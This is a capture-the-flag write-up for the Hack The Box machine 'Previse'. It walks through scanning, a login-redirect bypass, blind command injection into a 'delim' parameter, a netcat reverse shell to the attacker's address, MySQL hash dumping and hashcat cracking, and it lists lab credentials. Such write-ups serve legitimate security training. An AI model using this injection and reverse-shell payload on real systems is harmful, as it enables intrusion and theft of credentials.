# Previse

## Scanning 

`sudo nmap -sC -sV -oN nmap/initial 10.10.11.104  -v`

`gobuster dir -u 10.10.11.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`


### Open ports

```
22 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80 Apache httpd 2.4.29
```

## Users

```
root:mySQL_p@ssw0rd!:) -> creds for mysql db (previse)
m4lwhere:ilovecody112235! -> creds found in previse db 
```


## Endpoints

```
[16:32:23] 302 -    4KB - /accounts.php  ->  login.php
[16:32:28] 302 -    0B  - /download.php  ->  login.php
[16:32:29] 302 -    6KB - /files.php  ->  login.php
[16:32:30] 302 -    3KB - /index.php  ->  login.php
[16:32:30] 302 -    3KB - /index.php/login/  ->  login.php
[16:32:31] 302 -    0B  - /logout.php  ->  login.php
[16:32:35] 302 -    3KB - /status.php  ->  login.php
```



## Notes

* Found some redirects and tried to manipulate the 302 response to 200 OK in burp

![image](https://user-images.githubusercontent.com/12052283/130096341-94e2160b-5b44-49c9-ae90-f7fa9f705c31.png)

* Manipulating `/files.php`

![image](https://user-images.githubusercontent.com/12052283/130097012-1c7f6f5b-0737-4c51-83fd-af2434881c2c.png)

![image](https://user-images.githubusercontent.com/12052283/130097078-b98400a4-7c1d-47cd-ae29-8ac60e8f5409.png)

![image](https://user-images.githubusercontent.com/12052283/130097127-d149dd0e-6b84-4af5-8bef-8b192555f030.png)

* Created a new user and downloaded the siteBackup.zip

* In `logs.php` there is an `exec` command that executes a python script, so I can execute another command inside that. In the `http://10.10.11.104/file_logs.php` I can intercept in burp and I can inject the command in `delim` param.

* I tried using `id` , `ls`, `whoami` but I found that the injection was blind so no errors returned. Then I used `sleep 2` and it worked. So I spawn a rev shell using `space ; sleep 2 && nc -e /bin/sh 10.10.14.109 9991` url encoded in the `delim` param. The shell worked and I loged in as www-data

* Upgraded the shell using ...

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")' ENTER
Ctrl + Z
stty raw -echo ENTER
fg ENTER ENTER
export TERM=xterm
```

* Logged in into mysql and got the `m4lwhere` hash `$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.`

```bash
mysql -u root -p
mySQL_p@ssw0rd!:)
use previse;
select username,password from accounts;
```

![image](https://user-images.githubusercontent.com/12052283/130125384-1c250445-344a-405e-8302-4f23e0db4acc.png)

* Finding what hash is using `hashcat --example-hashes | grep '\$1' -B4`

* Executing hashcat to crack since I find the hash is a mode 500

![image](https://user-images.githubusercontent.com/12052283/130125578-18df65ab-78da-497d-ab05-f97bf8b08cd8.png)

* With the hash I ssh with user m4lwhere and got the `user.txt` flag



# References

* https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

* https://www.youtube.com/watch?v=JRPWFSzFaG0 -> minute 08:00
